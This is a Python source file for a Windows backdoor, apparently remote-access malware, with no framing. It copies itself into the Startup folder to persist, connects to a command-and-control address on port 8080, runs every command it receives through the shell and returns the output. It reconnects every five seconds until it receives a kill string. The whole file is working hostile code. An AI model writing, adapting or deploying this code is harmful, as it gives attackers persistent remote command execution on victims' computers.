import subprocess
import time
import os
import threading
import socket

CCIP = ""
CCPORT = 8080


def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py", ".exe")
    os.system(
        "copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\startup\"".format(exe_file))


def connection(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)


def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + "\n")
    except Exception as error:
        print(error)

def client_handler(client):
    while True:
        try:
            data = client.recv(1024).decode().strip()
            if data == "/:kill":
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
                
        except Exception as error:
            print(error)
            client.close()
            break

if __name__ == "__main__":
    autorun()
    while True:
        try:
            client = connection(CCIP, CCPORT)
            client_handler(client)
        except Exception as error:
            print(error)
            time.sleep(5)
            continue